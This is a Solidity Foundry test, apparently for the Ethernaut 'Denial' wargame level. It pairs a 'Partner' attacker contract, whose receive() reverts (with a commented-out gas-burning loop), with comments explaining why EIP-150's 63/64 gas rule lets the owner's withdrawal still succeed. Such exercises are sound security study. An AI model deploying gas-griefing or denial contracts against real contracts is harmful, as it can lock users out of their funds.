//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Denial} from "../Denial.sol";

contract DenialTest is Test {
    Denial denial;
    Partner partner;
    address owner;
    
    function setUp() public {
        denial = new Denial();
        owner = denial.owner();
        partner = new Partner();
        vm.deal(address(denial), 10 ether);
    }
    function test_Challenge20_Passed() public {
        denial.setWithdrawPartner(address(partner));
        vm.startPrank(owner);
        // vm.expectRevert();
        // owner won't be able to withdraw his funds
        // this attack is not possible in solidity newer version because of EIP 150 
        // https://rareskills.io/post/eip-150-and-the-63-64-rule-for-gas
        denial.withdraw();        
        vm.stopPrank();
    }
}
contract Partner {
    function stop() internal {
        revert();
    }
    function start() internal {
        stop();
    }
    receive() external payable {
        // if i use a while loop the 63/64 gas rule will allow owner to be able to withdraw his funds
        // uint256 add;
        // while(true) {
        //     add++;
        // }

        //         What Happens with the Gas:
        // Step	Gas Left	What Happens
        // 1	100,000	withdraw() starts
        // 2	100,000	partner.call is made
        // 3	100,000	63/64 rule applies
        // 4	98,437 → Partner	Partner receives this gas
        // 5	1,563 → Reserved	Reserved for withdraw() to finish
        // 6	98,437 → Partner	Partner runs while(true) { add++; }
        // 7	98,437 → 0	Partner burns ALL its gas
        // 8	0 → Partner	💥 Partner reverts (Out of Gas)
        // 9	But wait!	The 1,563 reserved gas is STILL available!
        // 10	1,563 → withdraw()	The revert from the child does NOT consume this gas
        // 11	1,563	withdraw() continues execution
        // 12	1,563	owner.transfer(amountToSend) executes successfully ✅
        // 13	1,563 → 0	Transaction completes successfully
        start();
    }
}   